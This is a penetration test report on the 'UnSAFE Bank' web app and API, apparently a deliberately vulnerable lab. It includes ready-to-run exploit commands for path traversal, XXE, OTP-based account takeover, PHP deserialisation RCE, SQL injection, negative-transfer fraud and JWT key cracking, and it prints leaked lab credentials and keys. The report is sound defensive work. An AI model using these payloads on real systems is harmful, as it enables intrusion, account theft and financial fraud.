# UnSAFE Bank — Black-Box Web & API Penetration Test Report

**Classification:** Confidential — client deliverable
**Engagement type:** Black-box (no source access, no prior knowledge assumed)

---

## 1. Engagement overview

| Item | Detail |
|---|---|
| Test date (UTC) | 2026-09-20 |
| Testing window | 2026-09-20 04:56 UTC → 2026-09-20 06:10 UTC |
| Operator/execution host | `143.244.130.163` (Linux, `/opt/engage-bb` workspace) |
| Target (web SPA) | `http://139.59.15.10:3000/` |
| Target (API / PHP app) | `http://139.59.15.10/api/` |
| Authorization | Self-hosted application; target owner confirmed authorization at the start of the engagement |
| Constraints honored | No DoS/load testing; no destructive writes; no third-party systems touched; all state-changing tests performed against **disposable accounts the tester created**; the one RCE proof self-deleted |

**Method note (black-box).** No application source code was read from the repository and no internet source was used for target information. Everything below was derived from the target's own responses, its publicly served client-side JavaScript bundles, and its exposed client source maps (all delivered by the target itself). Exploiting the file-read bug (F1) was later used to retrieve configuration files *through the target* as proof of impact — that is exploitation, not source-assisted enumeration.

---

## 2. Scope and rules of engagement

**In scope**
- `139.59.15.10` TCP/80 — Apache + PHP API (`/api/...`)
- `139.59.15.10` TCP/3000 — nginx-served React SPA

**Out of scope / not touched**
- Mail ports (25/465/587 — filtered; deliberately not probed)
- Any third-party SaaS, CDN, DNS control plane, or mail infrastructure
- Any host reachable only by pivoting off the target

**Prohibitions observed**
- No denial-of-service, no resource exhaustion, conservative rate limits throughout (`nmap -T3 --max-rate 500`, `ffuf -rate 10`).
- No destructive writes to production data. The only writes were: (a) a self-deleting PHP proof file written through the RCE bug, verified removed (HTTP 404 afterwards); (b) balances moved between two tester-owned accounts and restored exactly; (c) a beneficiary created on the tester's own account and deleted afterwards.
- No real user PII was copied off-host. All PII shown is lab data belonging to accounts created by the tester, plus a single cross-user proof row from a second tester-owned account.
- No account lockout storms: login cool-down observed (300 s) and respected; the OTP test was limited to 12 wrong attempts followed by one correct attempt.

---

## 3. Methodology

| Phase | What was done | Tools |
|---|---|---|
| 1. Passive | Reverse DNS; neutral egress check; asset/technology hypothesis | `dig`, `curl` |
| 2. Active scanning | Full TCP scan, service/version detection, default scripts | `nmap -sV -sC -T3 --max-rate 500 -p 1-65535` |
| 3. Enumeration | Server fingerprinting; SPA bundle analysis; client source-map recovery; API path discovery; authenticated endpoint mapping | `whatweb`, `curl`, `ffuf`, custom Python harness (`exploit/api.py`) |
| 4. Vulnerability analysis | Non-destructive validation of each hypothesis; CVE/CWE/OWASP mapping | `curl`, custom harness |
| 5. Controlled exploitation | Minimum-footprint PoCs; own accounts only; self-deleting RCE file | custom harness, `openssl`, `nc` (listener) |
| 6. Post-exploitation | Not required — application-layer impact fully demonstrated without host access. No persistence. | — |
| 7. Reporting | This document, redacted copy, turn log, artifact index with SHA-256 | — |

**Deviation from plan:** the plan's Phase 1 assumed DNS names; the targets are IP addresses, so classical subdomain/passive DNS work did not apply. Effort was redirected to fingerprinting the two HTTP services and analysing the SPA's own delivered JavaScript, which yielded the complete API surface.

---

## 4. Findings (ranked by risk)

**Rating method.** Each finding carries a CVSS v3.1 base vector; the score stated is that vector's base score. Severity bands: Critical ≥ 9.0, High 7.0–8.9, Medium 4.0–6.9, Low 0.1–3.9. Where a finding's real-world impact exceeds its base score, the narrative says so explicitly rather than inflating the number.

### F1 — Unauthenticated arbitrary file read (path traversal) · **Critical**
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5** (raised to Critical in context: the read yields database credentials and encryption keys, i.e. it is a stepping stone to full compromise)
- **Affected asset:** `GET http://139.59.15.10/api/show?file=<path>`
- **Description / root cause:** the `file` parameter is passed to a file-read routine that concatenates it onto an internal base path without normalising or restricting traversal. No authentication is required.
- **Reproduction (copy-pasteable):**
  ```bash
  curl -s 'http://139.59.15.10/api/show?file=../../../../etc/passwd'
  curl -s 'http://139.59.15.10/api/show?file=../../../var/www/html/api/application/config/database.php'
  curl -s 'http://139.59.15.10/api/show?file=../../../var/www/html/api/application/config/config.php'
  ```
- **Evidence.** `/etc/passwd` returned in full (30 users, incl. `www-data`). `database.php` returned DB credentials:
  `hostname=database`, `username=phpmyadmin`, `password=531486b2bf646636a6a1bba61e78ec4a4a54efbd`, `database=abstractwallet`.
  `config.php` returned `encryption_key = '9bbc0d79e686e847bc305c9bd4cc2ea6'` and `csrf_protection = FALSE`.
  Files: `evidence/f1-traversal-passwd.txt`, `evidence/f1-db-config.txt`, `evidence/f1-app-config.txt`.
- **Business impact:** an anonymous attacker reads any file the web user can read — including database credentials and the application encryption key. This is the entry point that makes F3 (OTP decryption) and F11 (token key context) trivially reachable.
- **Remediation.**
  - *Short term:* reject any `file` value containing `..`, `/`, or a null byte; allow-list the few static files the feature is meant to serve; disable the endpoint if unused.
  - *Long term:* remove user-controlled file paths entirely; serve static content from a dedicated directory with a fixed mapping; rotate the DB credentials and the `encryption_key` immediately (both are compromised).
- **References:** CWE-22, CWE-73, OWASP A01:2021 Broken Access Control.

### F2 — Unauthenticated XXE with file disclosure · **Critical**
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5** (Critical in context: unauthenticated file read of arbitrary text files)
- **Affected asset:** `POST http://139.59.15.10/api/ContactUs` (also `/api/contactUs`)
- **Description / root cause:** the XML body is parsed with external-entity and DTD loading enabled (`LIBXML_NOENT | LIBXML_DTDLOAD` per behaviour), and the expanded entity is reflected into the JSON response.
- **Reproduction:**
  ```bash
  printf '%s' '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r><name>&xxe;</name></r>' > /tmp/xxe.xml
  curl -sS -H "Content-Type: application/xml" --data-binary @/tmp/xxe.xml http://139.59.15.10/api/ContactUs
  ```
- **Evidence:** response `CTS001 "Thanks for contacting us …"` followed by the full contents of `/etc/passwd` (`evidence/f2-xxe-passwd.txt`).
- **Business impact:** second, independent unauthenticated file-read primitive. It also provides an SSRF vector (`SYSTEM "http://…"`) into the Docker network (`database` host resolves in-network).
- **Remediation.**
  - *Short term:* parse the body with external entities disabled (`libxml_disable_entity_loader(true)` / `LIBXML_NONET` without `NOENT`/`DTDLOAD`) and validate the schema.
  - *Long term:* replace XML with JSON for this endpoint; add an egress allow-list/deny-list for the API containers.
- **References:** CWE-611, OWASP A05:2021 Security Misconfiguration.

### F3 — Unauthenticated account takeover via OTP disclosure + unauthenticated password reset · **Critical**
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → **9.8**
- **Affected assets:** `POST /api/password/forgot`, `POST /api/password/verifyuser`, `POST /api/password/reset`
- **Description / root cause:** the forgot-password flow returns the OTP **in the HTTP response**, encrypted with a hard-coded AES key/IV that is shipped in the client JavaScript and also exposed in `config.php` (F1). The flow is unauthenticated: only the victim's `userid` (format `BNKxxxxx`) is required. The returned OTP is accepted verbatim by `verifyuser`, whose response yields the `otp_ref` consumed by `reset`.
- **Reproduction:**
  ```bash
  # 1. request OTP (no authentication, no token)
  curl -s -X POST http://139.59.15.10/api/password/forgot -H 'Content-Type: application/json' \
    -d '{"requestBody":{"data":{"userid":"BNK95153","otp_type":"4"}}}'
  # -> {"data":{"response":"<base64 ciphertext>"}}
  # 2. decrypt: AES-128-CBC, key = ASCII "9bbc0d79e686e847bc305c9bd4cc2ea6", iv = "0123456789abcdef" zero-padded to 16 bytes
  #    (the same key the client bundle uses; also present in config.php)
  # 3. verify + reset
  curl -s -X POST http://139.59.15.10/api/password/verifyuser -H 'Content-Type: application/json' \
    -d '{"requestBody":{"data":{"userid":"BNK95153","otp":"<decrypted>"}}}'   # -> otp_ref
  curl -s -X POST http://139.59.15.10/api/password/reset -H 'Content-Type: application/json' \
    -d '{"requestBody":{"data":{"userid":"BNK95153","otp_response":"<otp_ref>","new_pass":"<new>"}}}'
  ```
- **Evidence:** ciphertext `RpLahE4uhEGDBlkEFz/QNg==` → OTP `065207`; later `Ko0p8HK3nm42HwFcxz18og==` → `492550`; verify → ref `905520451318585`; reset → `PSW004 "Password Reset Successful"`. Files: `evidence/otp_forgot_A*.txt`, `evidence/otp_verifyuser_A.txt`, `evidence/reset_A_own.txt`, `evidence/otp_decrypted_A.raw`.
- **Business impact:** complete takeover of any customer account knowing only the customer id. No interaction with the victim is required. This is the highest-impact finding in the engagement.
- **Remediation.**
  - *Short term:* never return the OTP to the client; send it out-of-band (SMS/email). Remove the OTP-encryption key from the client bundle. Make `verifyuser`/`reset` bind the OTP to the exact `userid` and expire it after one use and a short TTL.
  - *Long term:* move to a server-side, single-use, rate-limited reset token (≥128-bit random) delivered out-of-band; rotate the `encryption_key`; require re-authentication on password reset.
- **References:** CWE-200, CWE-640, CWE-798, OWASP A07:2021 Identification & Authentication Failures.

### F9 — Cross-user password reset (OTP reference not bound to the target user) · **Critical**
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → **9.8**
- **Affected asset:** `POST /api/password/reset`
- **Description / root cause:** `verifyuser` returns an `otp_ref` that `reset` accepts for a **different** `userid` than the one the OTP was issued for. The reference is effectively a bearer token for "reset the password of the userid in the request body".
- **Reproduction (validated between two tester-owned accounts):**
  ```bash
  # obtain A's own otp_ref (as in F3) then apply it to B's userid
  curl -s -X POST http://139.59.15.10/api/password/reset -H 'Content-Type: application/json' \
    -d '{"requestBody":{"data":{"userid":"BNK00623","otp_response":"<A-otp_ref>","new_pass":"<new>"}}}' 
  ```
- **Evidence:** `reset` with A's reference and B's userid → `PSW004 Success`; login as B with the attacker-chosen password → `LGN002 Login Success`. B was then restored to its original password. Files: `evidence/f9_reset_B_with_A_ref.txt`, `evidence/f9-proof.txt`, `exploit/f9_proof.log`.
- **Business impact:** allows resetting an arbitrary account's password using an OTP legitimately obtained for the attacker's own account — removing even the need to know the victim's customer id (any valid OTP reference works). This makes F3 exploitable at scale.
- **Remediation.**
  - *Short term:* bind the OTP reference to the `userid` it was issued for and verify that binding on `reset`; invalidate the reference after first use.
  - *Long term:* use a signed, single-use, user-bound reset token; log and alert on mismatched-user reset attempts.
- **References:** CWE-640, CWE-863, OWASP A01:2021 Broken Access Control / A07:2021.

### F4 — Authenticated remote code execution via PHP object injection · **High**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` → **8.8**
- **Affected asset:** `POST /api/loan/apply` (authenticated; any signed-up account)
- **Description / root cause:** the client is expected to send a PHP-serialised object in the `type` field (`base64_encode(serialize(new LogWrite(...)))` is visible in the app's own JavaScript bundle). The server base64-decodes and `unserialize()`s it with a class allow-list that includes `LogWrite`, whose destructor writes `logdata` to `APPPATH/logs/<logfile>`. `logfile` is not sanitised, so traversal places the file in the web root.
- **Reproduction:**
  ```bash
  # token = any authenticated token; nonce chosen by the tester
  SER='O:8:"LogWrite":2:{s:7:"logfile";s:24:"../../../bbpoc_66155.php";s:7:"logdata";s:50:"<?php echo ''BBPOC_66155_OK''; @unlink(__FILE__); ?>";}'
  B64=$(printf '%s' "$SER" | base64 -w0)
  curl -s -X POST http://139.59.15.10/api/loan/apply -H 'Content-Type: application/json' -H "Authorization: $TOKEN" \
    -d "{\"requestBody\":{\"device\":{\"deviceid\":\"x\",\"os\":\"android\",\"host\":\"a.com\"},\"data\":{\"amount\":\"1000\",\"tenure\":\"12\",\"type\":\"$B64\",\"customerId\":\"BNK95153\"}}}"
  curl -s http://139.59.15.10/bbpoc_66155.php      # -> BBPOC_66155_OK
  curl -s -o /dev/null -w '%{http_code}' http://139.59.15.10/bbpoc_66155.php   # -> 404 (self-deleted)
  ```
- **Evidence:** `LOAN05 "Loan Successfully Applied"`; the written file executed and printed the nonce; a second request returned **404**, confirming the proof deleted itself. Files: `evidence/f4-loan-apply-resp.txt`, `evidence/f4-rce-proof.txt`; cleanup re-check in `report/artifact-index.txt` run output.
- **Business impact:** command execution as the web user (`www-data`) on the API container — full read/write of application data, database access with the leaked credentials, and potential lateral movement inside the Docker network. Because the vulnerable class is supply-chain-visible in the client bundle, the bug is discoverable by any authenticated user.
- **Remediation.**
  - *Short term:* stop accepting serialised objects from clients — send a plain scalar/enum for the loan type. If serialisation is unavoidable, use `allowed_classes => false` and never trust class-side effects.
  - *Long term:* remove the write-capable gadget (`LogWrite::__destruct` must not take a path from object state); enforce an allow-list for log file names; run PHP with `open_basedir` restricting writes to a dedicated directory. (Note: `open_basedir` and `disable_functions` are currently **empty** — see F13.)
- **References:** CWE-502, CWE-22, OWASP A08:2021 Software and Data Integrity Failures.

### F5 — Broken access control / IDOR: arbitrary customer KYC disclosure · **High**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` → **6.5** (rated High because the disclosed data is full KYC — Aadhaar, PAN, DOB, address, phone — at scale)
- **Affected asset:** `POST /api/account/details` (authenticated)
- **Description / root cause:** the endpoint returns the account record for the `userid` supplied in the request body without checking that it belongs to the caller's session. Any authenticated user can enumerate `BNK…` identifiers.
- **Reproduction:**
  ```bash
  curl -s -X POST http://139.59.15.10/api/account/details -H 'Content-Type: application/json' -H "Authorization: $TOKEN_A" \
    -d '{"requestBody":{"data":{"userid":"BNK00623"}}}'
  ```
- **Evidence:** account A's token returned account B's full record: account number, balance, `aadharId`, `panCardId`, DOB, address, mobile, email, `incomeTaxNumber`, `walletId`. File: `evidence/idor_A_reads_B.txt`.
- **Business impact:** mass disclosure of customer PII/KYC for any account whose identifier can be guessed or enumerated (`BNK` + 5 digits) — a serious privacy and regulatory exposure.
- **Remediation.**
  - *Short term:* derive the subject from the session token; ignore/reject a `userid` that differs from the authenticated principal.
  - *Long term:* central authorisation check on every account-scoped endpoint; return 403 (not data) on mismatch; add object-level access-control tests to CI.
- **References:** CWE-639, CWE-284, OWASP A01:2021 Broken Access Control.

### F6 — Authenticated SQL injection (`/api/beneficiary/fetch`) · **High**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` → **8.8**
- **Affected asset:** `POST /api/beneficiary/fetch` (the `alias` field)
- **Description / root cause:** `alias` is concatenated into the SQL string; the value's validation is not effective. Errors are reflected in the response, making this an error-based injection.
- **Reproduction:**
  ```bash
  curl -s -X POST http://139.59.15.10/api/beneficiary/fetch -H 'Content-Type: application/json' -H "Authorization: $TOKEN" \
    -d '{"requestBody":{"data":{"alias":"x'"'"' AND extractvalue(1,concat(char(126),database()))-- -"}}}'
  ```
- **Evidence (responses):**
  - `bob'` → MySQL syntax error reflecting the query fragment `… near ''BOB'' AND user_id_fk = 23'`.
  - `extractvalue` extraction → database `abstractwallet`, version `8.0.19`, user `phpmyadmin@172.18.0.3`.
  - `information_schema` extraction → tables `account_details`, `bank_master`, `beneficiary_details`, `ci_sessions`, …; columns `account_details(id_pk,user_id_fk,user_details_id_fk,bank_master_id_fk,account_no,account_balance,income_tax_number,account_opening_date,…)`.
  - Files: `evidence/sqli_fetch_quote.txt`, `evidence/sqli_database.txt`, `evidence/sqli_version.txt`, `evidence/sqli_user.txt`, `evidence/sqli_tables_1.txt`, `evidence/sqli_acct_cols_1.txt`.
- **Note on the injected-value transform:** the value passes through upper-casing, so string literals must be supplied with `char(...)` and lower-case table names cannot be referenced directly from injected SQL (this limited extraction but does not prevent exploitation).
- **Business impact:** read and (potentially) modify any data in the application database, including balances and KYC records, using the leaked DB account.
- **Remediation.**
  - *Short term:* convert the query to a parameterised statement (CodeIgniter query bindings); remove the raw error reflection from API responses.
  - *Long term:* enforce parameterised queries as a coding standard with CI linting; run the DB account with least privilege (the app currently connects as `phpmyadmin` — administrative privileges — see F1); enable `mysqli` error suppression in production.
- **References:** CWE-89, OWASP A03:2021 Injection.

### F7 — Business logic flaw: negative-amount transfer credits the sender · **High**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` → **6.5** (rated High: direct, repeatable financial-integrity impact)
- **Affected asset:** `POST /api/beneficiary/pay` (authenticated; OTP type 3)
- **Description / root cause:** the transfer amount is accepted as a signed value. The client UI restricts input to digits, but the server performs no independent validation, so a negative amount reverses the direction of the ledger entries and increases the sender's balance.
- **Reproduction (between the tester's own two accounts):**
  ```bash
  # OTP type 3 (obtain ref via /api/otp/get + /api/otp/verify)
  curl -s -X POST http://139.59.15.10/api/beneficiary/pay -H 'Content-Type: application/json' -H "Authorization: $TOKEN_A" \
    -d '{"requestBody":{"data":{"alias":"BOBTEST","amount":"-1.00","remarks":"test","otp_response":"<ref>"}}}'
  ```
- **Evidence:** before `A=631737.69  B=956922.29`; after `amount=-1.00` → `A=631738.69  B=956921.29` (`BNF015`, transaction `6825005384`); a `+1.00` transfer restored both to the original values (transaction `4797157263`). The account statement shows the negative entry: `amount "-1"`, `type DEBIT`, `fromToAcc 911777887041`. Files: `evidence/f7-balances-before.txt`, `evidence/f7_negative_pay.txt`, `evidence/f7-balances-after-negative.txt`, `evidence/f7-balances-restored.txt`, `evidence/statement_A_final.txt`.
- **Business impact:** a customer can mint value for themselves and drain any counterparty they can send to; repeated execution is a direct financial loss. Only the tester's own accounts were used, and balances were restored.
- **Remediation.**
  - *Short term:* validate `amount > 0` server-side, with a minimum and maximum, and reject non-numeric/signed input.
  - *Long term:* enforce balance/limit invariants in a transaction with double-entry ledger checks; add domain-level tests for sign, zero, rounding, and boundary values.
- **References:** CWE-1284, CWE-20, OWASP A04:2021 Insecure Design.

### F8 — Password change does not verify the current password · **Medium**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` → **6.5**
- **Affected asset:** `POST /api/password/change` (authenticated)
- **Description / root cause:** the endpoint accepts a new password without validating `old_pass`. A caller with only a session token (e.g. a stolen/XSS-captured token, an unlocked shared device) can silently change the password and lock the owner out.
- **Reproduction:**
  ```bash
  curl -s -X POST http://139.59.15.10/api/password/change -H 'Content-Type: application/json' -H "Authorization: $TOKEN" \
    -d '{"requestBody":{"data":{"old_pass":"definitelywrong99","new_pass":"<new>"}}}'
  ```
- **Evidence:** `old_pass` deliberately wrong → `PSW008 "Password Changed Successfully"` (`evidence/chmod_A_wrongold.txt`). The tester's own account was set back to its original value.
- **Business impact:** session hijacking is escalated to permanent account takeover; removes the last authentication factor needed to rotate credentials.
- **Remediation.**
  - *Short term:* require and verify the current password before applying a change.
  - *Long term:* require re-authentication (or a step-up OTP) for credential/contact changes; notify the user by email on password change.
- **References:** CWE-620, CWE-306, OWASP A07:2021.

### F11 — Weak, recoverable JWT signing key and PII in the token payload · **Medium**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` → **6.5** for the PII disclosure; key recovery is offline
- **Affected asset:** `POST /api/login` (token issued to every client)
- **Description / root cause:** the session token is an HS256 JWT whose payload contains full PII (`acctNo`, `acctBalance`, `aadharId`, `panCardId`, `dob`, `address`, `mobileNo`, `email`, `incomeTaxNumber`, `walletId`). The signing key is the dictionary word **`unsafebank`** — recovered offline by testing a short candidate list against the token's HMAC.
- **Reproduction:**
  ```bash
  # decode
  python3 - <<'EOF'
  import base64,json; t=open('token_A.txt').read().strip(); h,p,s=t.split('.')
  print(base64.urlsafe_b64decode(p+'='*(-len(p)%4)).decode())
  EOF
  # recover key (offline)
  python3 - <<'EOF'
  import hmac,hashlib,base64; t=open('token_A.txt').read().strip(); h,p,s=t.split('.')
  print(hmac.compare_digest(hmac.new(b'unsafebank',(h+'.'+p).encode(),hashlib.sha256).digest(),
                            base64.urlsafe_b64decode(s+'='*(-len(s)%4))))
  EOF   # -> True
  ```
- **Evidence:** re-signing the payload with `unsafebank` reproduces the original token byte-for-byte (`evidence/f11-jwt-resign.txt`). **However**: a forged token with a modified payload (`exp` extended; `email` changed) was rejected with `ERRO06 "Session is invalid"` (`evidence/f11-jwt-forged-extended.txt`) — the server additionally validates the token against a server-side session store, so key recovery alone did not yield authentication bypass during testing.
- **Business impact:** anyone who can observe a token (logs, proxies, browser storage, referrer leakage) reads a full KYC dataset without any further access. The weak key means token forgery is one control-removal away from full compromise and must be treated as compromised.
- **Remediation.**
  - *Short term:* rotate to a long random signing key; stop placing PII in the token — carry only an opaque session id or a minimal subject claim.
  - *Long term:* use a managed key/secret store with rotation; consider asymmetric signing (RS256) with short expiry and refresh tokens; keep server-side session validation (already present — preserve it).
- **References:** CWE-798, CWE-522, CWE-315, OWASP A02:2021 Cryptographic Failures.

### F12 — No attempt limit or lockout on OTP verification · **Medium**
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` → **5.4**
- **Affected asset:** `POST /api/otp/verify` (authenticated contexts; type 3 protects fund transfers)
- **Description / root cause:** OTP verification accepts unlimited incorrect guesses; no counter, delay, or lockout is applied for the transfer OTP type.
- **Reproduction:**
  ```bash
  for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
    curl -s -X POST http://139.59.15.10/api/otp/verify -H 'Content-Type: application/json' -H "Authorization: $TOKEN" \
      -d "{\"requestBody\":{\"data\":{\"otp\":\"99999$i\"}}}"
  done
  # then submit the genuine OTP -> still accepted
  ```
- **Evidence:** 12 consecutive wrong OTPs each returned `OTP004 "Incorrect OTP"` with no counter or lockout; the genuine OTP (`193139`) then returned `OTP003 "OTP Verification Successful"`. Files: `evidence/otp_verify_wrong_*.txt`, `evidence/otp_verify_correct_after_failures.txt`.
- **Business impact:** a 6-digit transfer OTP can be brute-forced (10⁶ space) without lockout — and it is not even needed given F3, which discloses the OTP directly. Note: the login flow does have a 300 s cool-down, so this weakness is specific to OTP verification.
- **Remediation.**
  - *Short term:* cap OTP attempts (e.g. 3–5), invalidate the OTP on exhaustion, and add incremental delay.
  - *Long term:* server-side rate limiting per user/device/IP plus alerting on repeated failures.
- **References:** CWE-307, CWE-799, OWASP A07:2021.

### F13 — Security misconfiguration and information disclosure · **Medium**
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **5.3**
- **Affected assets:** `/info.php`, API error handling, SPA static assets
- **Description / root cause (all confirmed live):**
  1. **phpinfo() publicly exposed** at `http://139.59.15.10/info.php` (87,829 bytes) — reveals PHP 7.2.7 (EOL), Apache 2.4.33, `DOCUMENT_ROOT=/var/www/html/`, FastCGI/`FPM`, `expose_php=On`, and — importantly — **`disable_functions` and `open_basedir` are both empty** (which is what made F4's web-root write possible).
  2. **Development mode / verbose errors**: malformed requests return PHP notices with file paths and line numbers, e.g. signup without a `device` block → `Notice: Undefined index: device` in `models/SignUpModuleHandler.php:241` (backtrace included).
  3. **Client source maps served publicly**: `/static/js/main.f035a24d.chunk.js.map` and `/static/js/2.20947fb4.chunk.js.map` both return **HTTP 200**, exposing the full front-end source tree (route table, thunks, and the OTP decryption routine).
- **Reproduction:**
  ```bash
  curl -sI http://139.59.15.10/info.php | head -1
  curl -s -X POST http://139.59.15.10/api/signup -H 'Content-Type: application/json' -d '{"requestBody":{"data":{"firstname":"Gamma"}}}'
  curl -sI http://139.59.15.10:3000/static/js/main.f035a24d.chunk.js.map | head -1
  ```
- **Evidence:** `evidence/f13-phpinfo.html`, `evidence/f16-signup-nodevice.txt`, `evidence/f13-cors.txt`, plus the recovered maps in `web/*.map`.
- **Business impact:** accelerates every other attack (stack fingerprints, absolute paths, exact secret locations, client logic). `X-Powered-By: PHP/7.2.7` on every API response adds to the disclosure.
- **Remediation.**
  - *Short term:* delete `/info.php`; set `display_errors=Off`, `log_errors=On`, `expose_php=Off`; disable `.map` generation for production builds (or block `*.map` at nginx).
  - *Long term:* set `open_basedir` and a minimal `disable_functions` list for the web SAPI; patch EOL PHP; add a deployment check that fails the build if debug artefacts are present.
- **References:** CWE-200, CWE-215, CWE-16, OWASP A05:2021 Security Misconfiguration.

### F14 — CORS wildcard origin with credentials allowed · **Medium**
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` → **6.1**
- **Affected asset:** every API endpoint (`/api/*`)
- **Description / root cause:** responses carry `Access-Control-Allow-Origin: *`, `Access-Control-Allow-Headers: *`, `Access-Control-Allow-Methods: *` **together with** `Access-Control-Allow-Credentials: true`. Any web origin can drive the API on behalf of a victim who has an active session, and read the response.
- **Reproduction:**
  ```bash
  curl -s -i -X OPTIONS http://139.59.15.10/api/login -H 'Origin: http://attacker.example' | grep -i access-control
  ```
- **Evidence:** `evidence/f13-cors.txt`. Note the credentials mode relies on cookies/localStorage in the SPA; the API itself is token-based, which limits but does not remove the risk (tokens are stored in `localStorage` and reachable by any script in a same-origin XSS, and browser clients that send credentials would be fully exposed).
- **Business impact:** enables cross-origin attacks that read authenticated data, and widens the blast radius of any XSS in the SPA.
- **Remediation.**
  - *Short term:* replace `*` with an explicit allow-list of trusted origins; remove `Allow-Credentials` unless a specific origin needs it.
  - *Long term:* centralise CORS policy and test it in CI; do not reflect arbitrary `Origin` values.
- **References:** CWE-942, CWE-346, OWASP A05:2021.

### Observations (not confirmed vulnerabilities)

- **O1 — Blind SSRF via profile `avatar` URL (not reproducible).** The client submits a profile-picture URL, and the field was expected to be fetched server-side. Every attempted value was rejected with `EDIT12 "Profile Picture link is invalid"`: `http://<operator-ip>:8899/a.jpg`, `https://…:8899/a.jpg`, `http://…sslip.io:8899/a.jpg`, `file:///etc/passwd`, and an empty string. A listener on the operator host received no connection, and a real HTTP server serving a JPEG produced no request either. With no reproduction path this is recorded as an **observation**, not a vulnerability. Worth a code-level review of the avatar validation and fetch routine.
- **O2 — Password hashing algorithm not verified.** No password hash could be obtained black-box (the `user` table cannot be referenced from the injection point because injected identifiers are upper-cased, and lower-case table names are case-sensitive). Hashing strength is therefore unverified; the DB account itself carries administrative privileges (F1/F6), which is the more relevant control gap.

---

## 5. Attack narrative

The findings chain into two complete kill-chains, both demonstrated during the engagement.

**Chain 1 — fully unauthenticated takeover (no account required):**
1. **F1/F2** read arbitrary files anonymously. `config/database.php` yields the database credentials (`phpmyadmin` / hash) and `config.php` yields the application `encryption_key`.
2. **F3** requests a password-reset OTP for any `BNK…` user id and receives the ciphertext in the response. The key needed to decrypt it is published in the client bundle (and confirmed by the config leak).
3. **F9** then shows the reference obtained from the attacker's *own* account is accepted when resetting *any* user id — so an attacker does not even need a victim id to reset a password they can enumerate.
4. The attacker logs in as the victim with full access to balances, statements, beneficiaries, and transfers.

**Chain 2 — authenticated to code execution and financial fraud:**
1. Ordinary signup yields a session.
2. **F4** turns the loan endpoint into code execution: a serialised `LogWrite` object writes PHP into the web root, executed, then self-deleted (RCE as `www-data`).
3. **F6** provides direct SQL access to `abstractwallet` — balances, KYC, sessions; **F5** provides the same KYC through a plain API call with less noise.
4. **F7** mints money: a negative transfer increases the sender's balance at the payee's expense.
5. **F8/F12** remove the remaining barriers (current-password check and OTP attempt limit).

**What stopped a full takeover during this test:** the server validates JWTs against a server-side session store, so the recovered signing key (**F11**) alone did not allow a forged token to be used. That control should be preserved.

---

## 6. Positive observations

- **Server-side session binding for JWTs.** Even with the signing key recovered, forged tokens were rejected (`ERRO06 "Session is invalid"`). Keep this.
- **Login cool-down.** A 300-second cool-down prevents rapid password spraying against `/api/login` (observed twice while re-authenticating).
- **Per-user beneficiary scoping.** `/api/beneficiary/list`, `/api/beneficiary/get`, and `/api/beneficiary/fetch` returned only the caller's own beneficiaries; cross-account lookups (despite identical aliases such as "John") resolved to different account numbers per user. No horizontal flaw found there.
- **OTP single-use enforcement.** An `otp_ref` was consumed on its first use and subsequently rejected (`OTP008 "OTP Response not valid"`), which constrained brute-force attempts and is correct behaviour.
- **Client-side input constraints.** The SPA restricts amount/keypad input to digits; the failure is that the server does not repeat those checks (F7).

---

## 7. Remediation roadmap

| Priority | Action | Findings | Effort |
|---|---|---|---|
| P0 (immediate) | Remove the `file` parameter / allow-list static files; fix the traversal | F1 | S |
| P0 | Never return OTPs to clients; deliver out-of-band; bind OTP to user and single use | F3, F9 | M |
| P0 | Stop deserialising client objects on `/api/loan/apply` | F4 | S |
| P0 | Derive the account subject from the authenticated session | F5 | S |
| P0 | Rotate the DB credentials (`phpmyadmin`) and the `encryption_key`; restrict DB privileges to least privilege | F1, F3, F6, F11 | M |
| P1 | Parameterise the `beneficiary/fetch` query; stop reflecting DB errors | F6 | S |
| P1 | Validate `amount > 0` server-side; add ledger invariants | F7 | S |
| P1 | Require the current password for password change; step-up auth for sensitive changes | F8 | S |
| P1 | Disable external entities in XML parsing (or move to JSON) | F2 | S |
| P1 | Rotate the JWT signing key to a long random secret; remove PII from tokens | F11 | M |
| P2 | OTP attempt cap + rate limiting | F12 | S |
| P2 | Delete `/info.php`; `display_errors=Off`, `expose_php=Off`; stop publishing source maps; set `open_basedir`/`disable_functions`; patch EOL PHP | F13 | M |
| P2 | Replace `*` CORS with an allow-list; drop `Allow-Credentials` where unneeded | F14 | S |
| P2 | Review the avatar URL validation/fetch routine | O1 | S |
| P3 | Add object-level access-control and negative-input tests to CI; enable structured security logging and alerting | all | L |

Effort: S ≈ < 1 day, M ≈ 2–5 days, L ≈ 1–2 weeks.

---

## 8. Appendices

### A. Raw scan output
Full TCP + version scan (`nmap -sV -sC -T3 --max-rate 500 -p 1-65535`):

```
Host: 139.59.15.10 ()  Status: Up
Ports: 22/open/tcp//ssh//OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)/
       80/open/tcp//http//Apache httpd/
       3000/open/tcp//http//nginx 1.31.6/
```
Stored: `scans/nmap-139.59.15.10-sV.xml`, `.txt`, `.gnmap`.

